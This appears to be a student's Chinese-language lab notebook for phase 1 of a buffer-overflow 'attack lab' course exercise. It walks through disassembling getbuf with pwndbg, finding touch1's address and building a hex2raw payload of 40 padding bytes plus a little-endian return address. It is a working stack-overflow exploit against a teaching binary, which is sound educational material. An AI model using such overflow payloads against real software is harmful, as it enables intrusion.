# 第三周lab实验笔记
本次实验共五个任务，前三个在ctaget上，4和5在rtarget上。
一开始看这个实验一脸懵逼，看的官网的writewp大体明白了这个实验是个啥子意思

## phase_1
根据writewp上的源码，我们需要通过栈溢出控制程序流程跳转至touch1函数
test函数源码
```
1 void test()
2 {
3 int val;
4 val = getbuf();
5 printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```
test函数中调用了getbuf函数，查看其反汇编代码
```
pwndbg> disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    rsp,0x28
   0x00000000004017ac <+4>:	mov    rdi,rsp
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    eax,0x1
   0x00000000004017b9 <+17>:	add    rsp,0x28
   0x00000000004017bd <+21>:	ret    
```
可以看到只需要溢出0x28的数据即可覆盖rip控制程序流程
查看touch1的地址
```
pwndbg> p touch1
$1 = {void ()} 0x4017c0 <touch1>
```
然后就是这次实验给出的工具hex2raw，我们需要通过这个工具生成字符串完成实验
创建attach.txt并在其中存入如下内容
```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 c0 17 40
```
前面这些a的十六进制表示我是拿010生成的，后面再手动补上小端存储的touch1地址
然后执行程序完成本次实验
